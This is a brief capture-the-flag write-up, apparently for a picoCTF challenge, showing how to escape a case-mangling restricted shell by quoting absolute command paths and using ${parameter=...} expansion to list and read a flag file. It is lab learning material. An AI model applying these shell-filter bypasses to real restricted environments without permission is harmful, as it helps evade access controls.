![image](https://github.com/jowp-code/ctf/assets/121969489/3c943006-c290-4caa-abf7-51577be8aa1f)
<br>
<p>Well this sounds like fun, *nix has historically been very strict with input in terms of case, windows on the other hand is less strict about it. I'm expecting a lot of broken commands here.</p>
<br>

```shell
ssh -p 59617 ctf-player@saturn.picoctf.net
```
<br>
<p>I immediately tried to clear my screen, oh boy...</p>
<br>

```shell
Special$ clear
Clear 
sh: 1: Clear: not found
```
<br>
<p>Immediately I can see that standard commands are going to be useless here, so what CAN we do? Well shortcuts are broken because of the restrcitions the shell is placing upon our inputs, I found that I could wrap a command in single quotes like 'pwd', but certain commands were not availble.</p>
<br>

```shell
Special$ 'pwd'
'pwd' 
/home/ctf-player
```
<br>
<p>So let's try quoting the absolute path to the command and they try it again.</p>
<br>

```shell
Special$ '/bin/ls'
'/bin/ls' 
blargh
```
<br>
<p>So we can quote the absolute path to get around the shell restrcitions, we can also do this with cat to read files. First let's see what's inside the blargh folder, and if it's our flag, read it.</p>
<br>

```shell
Special$ '/bin/ls' 'blargh'
'/bin/ls' 'blargh' 
flag.txt
Special$ '/bin/cat' 'blargh/flag.txt'
'/bin/cat' 'blargh/flag.txt' 
picoCTF{REDACTED}
```
<br>
<p>I realized later on that we could also have used 'parameter' to send the command.</p>
<br>

```shell
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat blargh/flag.txt} 
picoCTF{REDACTED}
```
